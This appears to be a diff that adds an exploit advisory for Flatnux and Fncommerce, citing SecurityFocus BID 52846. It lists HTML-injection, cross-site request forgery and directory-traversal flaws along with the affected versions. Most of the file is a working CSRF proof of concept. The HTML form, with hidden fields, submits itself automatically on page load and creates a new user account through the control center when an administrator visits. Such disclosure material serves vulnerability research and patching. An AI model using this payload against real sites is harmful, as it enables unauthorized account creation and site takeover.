@@ -1,0 +1,40 @@
+source: http://www.securityfocus.com/bid/52846/info
+ 
+Flatnux is prone to multiple security vulnerabilities:
+ 
+1. An HTML-injection vulnerability
+2. A cross-site request-forgery vulnerability
+3. A directory-traversal vulnerability
+ 
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials, obtain sensitive information, or control how the site is rendered to the user. Other attacks are also possible.
+ 
+The following versions are vulnerable:
+ 
+Flatnux 2011-08.09.2
+Flatnux 2011-2012-01.03.3
+Flatnux 2011-minimal-2012-01.03.3
+Fncommerce 2010-08-09-no-db
+Fncommerce 2010-08-09-no-sample-data
+Fncommerce 2010-08-09-with-sample-data
+Fncommerce 2010-12-17-no-db
+Fncommerce 2010-12-17-no-sample-data
+Fncommerce 2010-12-17-with-sample-data 
+
+<html>
+<form  name="test" 
+action="http://www.example.com/flatnux/controlcenter.php?page___xdb_fn_users=1&order___xdb_fn_users=username&desc___xdb_fn_users=&op___xdb_fn_users=insnew&page___
+xdb_fn_users=&op=editdata&opt=utilities/xmldb_admin&t=fn_users" method="post">
+<input type="hidden" name="username" value="csrf"><br/>
+<input type="hidden" name="email" value="csrf () hotmail com"><br/>
+<input type="hidden" name="passwd" value="186911"><br/>
+<input type="hidden" name="passwd_retype" value="186911"><br/>
+<input type="hidden" name="name" value="csrf"><br/>
+<input type="hidden" name="surname" value="Mr"><br/>
+<input type="hidden" name="link" value="http"><br/>
+<input type="hidden" name="avatarimage" value=""><br/>
+<input type="hidden" name="avatar" value=""><br/>
+<input type="hidden" name="save___xdb_fn_users" value="__xdb_fn_users"><br\>
+<input type="hidden" name="activ" value=1><br/>
+</form>
+<script>document.test.submit();</script>
+</html>
